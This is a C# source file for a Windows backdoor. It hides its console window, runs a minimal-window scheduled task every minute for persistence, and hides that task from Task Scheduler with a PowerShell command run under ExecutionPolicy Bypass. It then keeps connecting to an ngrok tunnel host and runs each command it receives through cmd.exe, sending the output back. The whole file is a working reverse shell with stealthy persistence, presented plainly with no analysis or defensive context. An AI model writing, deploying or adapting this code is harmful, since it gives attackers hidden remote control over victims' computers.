using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;  // for FreeConsole
using System.Threading;
using System.Linq; // for Where

class Program
{
    // P/Invoke to detach from and hide any console
    [DllImport("kernel32.dll")]
    static extern bool FreeConsole();

    static void Main()
    {
        // 1) Detach from any console immediately
        FreeConsole();

        // 2) Install persistence
        string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
        SetupTaskPersistence(exePath);

        // 3) Main beacon loop
        while (true)
        {
            try
            {
                using (TcpClient client = new TcpClient("4.tcp.ngrok.io", 19043))
                using (NetworkStream stream = client.GetStream())
                using (var reader = new StreamReader(stream))
                using (var writer = new StreamWriter(stream) { AutoFlush = true })
                {
                    string input;
                    while ((input = reader.ReadLine()) != null)
                    {
                        var p = new Process();
                        p.StartInfo.FileName        = "cmd.exe";
                        p.StartInfo.Arguments       = "/c " + input;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardError  = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.CreateNoWindow  = true;
                        p.Start();
                        
                        string output = p.StandardOutput.ReadToEnd() 
                                      + p.StandardError.ReadToEnd();
                        writer.WriteLine(output);
                        p.WaitForExit();
                    }
                }
            }
            catch
            {
                Thread.Sleep(new Random().Next(1000, 1000));
            }
        }
    }

static void SetupTaskPersistence(string exePath)
{
    try
    {
        const string taskName = "Persistence";

        // Check if another instance is running
        var currentProcess = Process.GetCurrentProcess();
        var runningProcesses = Process.GetProcessesByName(currentProcess.ProcessName)
            .Where(p => p.Id != currentProcess.Id && p.MainModule.FileName == currentProcess.MainModule.FileName);

        if (runningProcesses.Any())
        {
            // Another instance is already running, don't schedule the task
            return;
        }

        // Create a scheduled task that runs minimized every minute
        string createCmd = string.Format(
            "/c schtasks /create /tn \"{0}\" " +
            "/tr \"cmd.exe /c start \\\"\\\" /min \\\"{1}\\\"\" " +
            "/sc minute /mo 1 /f",
            taskName, exePath);
        RunHiddenProcess("cmd.exe", createCmd);

        // Hide the task from the Task Scheduler UI
        string psCmd = string.Format(
            "(Get-ScheduledTask -TaskName \"{0}\").Settings.Hidden = $true; " +
            "Set-ScheduledTask -TaskName \"{0}\" -InputObject (Get-ScheduledTask -TaskName \"{0}\")",
            taskName);
        RunHiddenProcess("powershell.exe", "-NoProfile -ExecutionPolicy Bypass -Command \"" + psCmd + "\"");
    }
    catch (Exception ex)
    {
        File.WriteAllText("tsk_persist_err.txt", ex.ToString());
    }

    }

    // Helper to launch a hidden Process and wait
    static void RunHiddenProcess(string fileName, string arguments)
    {
        var p = new Process();
        p.StartInfo.FileName        = fileName;
        p.StartInfo.Arguments       = arguments;
        p.StartInfo.CreateNoWindow  = true;
        p.StartInfo.UseShellExecute = false;
        p.Start();
        p.WaitForExit();
    }
}
